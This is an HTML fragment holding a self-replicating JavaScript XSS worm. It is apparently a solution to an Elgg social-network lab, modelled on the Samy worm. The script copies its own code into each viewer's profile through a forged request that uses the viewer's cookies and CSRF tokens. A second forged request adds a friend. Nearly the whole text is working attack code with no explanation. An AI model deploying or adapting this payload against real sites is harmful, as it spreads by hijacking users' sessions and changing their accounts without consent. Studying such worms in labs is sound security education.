<p>&nbsp;</p>
<script id="worm" type="text/javascript">// <![CDATA[
var copy = document.getElementById("worm").innerHTML;
var header = "<script id=\"worm\" type=\"text/javascript\">";
var tail = "</".concat("script>");
var Ajax = new XMLHttpRequest();
Ajax.open("POST","http://www.xsslabelgg.com/action/profile/edit",true);
Ajax.setRequestHeader("Host","www.xsslabelgg.com");
Ajax.setRequestHeader("Keep-Alive","300");
Ajax.setRequestHeader("Connection","keep-alive");
Ajax.setRequestHeader("Cookie",document.cookie);
Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
var content="__elgg_token=".concat(elgg.security.token.__elgg_token).concat("&__elgg_ts=").concat(elgg.security.token.__elgg_ts).concat("&name=").concat(elgg.session.user.name).concat("&guid=").concat(elgg.session.user.guid).concat("&description=").concat(escape(header.concat(copy).concat(tail))).concat("&location=hello").concat("&accesslevel[description]=2&accesslevel[location]=2");
Ajax.send(content);
Ajax = new XMLHttpRequest();
var requestData = "&__elgg_ts=".concat(elgg.security.token.__elgg_ts).concat("&__elgg_token=").concat(elgg.security.token.__elgg_token);
Ajax.open("POST","http://www.xsslabelgg.com/action/friends/add?friend=42".concat(requestData), true);
Ajax.setRequestHeader("Host","www.xsslabelgg.com");
Ajax.setRequestHeader("Keep-Alive","300");
Ajax.setRequestHeader("Connection","keep-alive");
Ajax.setRequestHeader("Cookie",document.cookie);
Ajax.setRequestHeader("Content-Type","multipart/form-data");
content="__elgg_token=".concat(elgg.security.token.__elgg_token).concat("&__elgg_ts=").concat(elgg.security.token.__elgg_ts).concat("&name=Samy&guid=42");
Ajax.send(content);
// ]]></script>
